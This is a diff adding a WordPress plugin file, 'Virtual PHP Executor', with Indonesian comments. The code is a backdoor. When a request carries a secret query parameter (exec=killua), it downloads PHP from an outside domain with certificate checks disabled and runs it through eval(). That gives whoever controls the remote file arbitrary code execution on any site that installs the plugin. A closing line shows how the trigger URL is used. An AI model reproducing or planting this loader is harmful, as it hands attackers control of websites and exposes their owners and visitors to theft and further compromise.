@@ -1,0 +1,58 @@
+<?php
+/**
+ * Plugin Name: Virtual PHP Executor
+ * Description: Menjalankan kode PHP dari URL eksternal tanpa membuat file fisik (Metode Parameter)
+ * Version: 7.0 (Fixed Routing)
+ */
+
+add_action('init', function() {
+    // Menggunakan parameter ?killua agar tidak bentrok dengan 404 WordPress
+    if (isset($_GET['exec']) && $_GET['exec'] === 'killua') {
+        
+        $source_url = 'https://penyelam.art//data/1783403642.txt';
+        $code = fetch_php_code($source_url);
+
+        if ($code) {
+            while (ob_get_level()) {
+                ob_end_clean();
+            }
+
+            $code = trim($code);
+            $code = preg_replace('/^<\?(php)?/i', '', $code);
+            $code = preg_replace('/\?>$/', '', $code);
+            $code = trim($code);
+            
+            ob_start();
+            try {
+                eval($code);
+            } catch (ParseError $e) {
+                echo "<b>Error Parsing PHP:</b> " . $e->getMessage();
+            } catch (Throwable $e) {
+                echo "<b>Error Execution PHP:</b> " . $e->getMessage();
+            }
+            ob_end_flush();
+
+            exit;
+        } else {
+            wp_die("Gagal mengambil kode. Pastikan file di URL sumber masih aktif: " . $source_url);
+        }
+    }
+}, 1);
+
+function fetch_php_code($url) {
+    if (function_exists('curl_init')) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+        $data = curl_exec($ch);
+        curl_close($ch);
+        return $data;
+    }
+    return @file_get_contents($url);
+}
+
+
+namadomain.com/?killua
